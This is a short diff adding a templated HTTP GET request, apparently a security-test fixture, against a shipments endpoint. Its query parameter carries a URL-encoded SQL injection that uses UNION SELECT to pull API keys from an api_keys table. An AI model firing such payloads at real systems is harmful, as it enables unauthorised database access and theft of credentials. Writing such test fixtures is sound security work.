@@ -1,0 +1,2 @@
+GET {{TARGET}}/shipments?{{CARRIER_PARAM}}=SHP-101%27%20UNION%20SELECT%20id%2Ccarrier_code%2Capi_key%2Cissued_on%2C1%20FROM%20api_keys--%20 HTTP/1.1
+Accept: */*
